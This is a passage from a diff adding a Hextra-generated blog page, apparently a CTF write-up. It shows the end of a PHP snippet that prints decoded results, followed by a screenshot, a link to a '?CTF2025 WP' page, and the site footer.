+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;解码: &#34;</span> <span style="color:#f92672">.</span> $result[<span style="color:#e6db74">&#39;decoded&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;---</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251007224607689.png" alt="image-20251007224607689"  loading="lazy" /></p>
+
+        </div><div class="hx:mt-16"></div><div class="hx:mb-8 hx:flex hx:items-center hx:border-t hx:pt-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-neutral-400 hx:dark:contrast-more:border-neutral-400 hx:print:hidden"><a
+        href="/wp/ilovectf2025-wp/"
+        title="?CTF2025 WP"
+        class="hx:flex hx:max-w-[50%] hx:items-center hx:gap-1 hx:py-4 hx:text-base hx:font-medium hx:text-gray-600 hx:transition-colors [word-break:break-word] hx:hover:text-primary-600 hx:dark:text-gray-300 hx:md:text-lg hx:ltr:ml-auto hx:ltr:pl-4 hx:ltr:text-right hx:rtl:mr-auto hx:rtl:pr-4 hx:rtl:text-left"
+      >?CTF2025 WP<svg class="hx:inline hx:h-5 hx:shrink-0 hx:rtl:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div></main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hextra-custom-footer hextra-max-footer-width hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>由 Hextra 驱动<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script>
+        <script defer src="/en.search.js" integrity=""></script>
+  </body>
+</html>
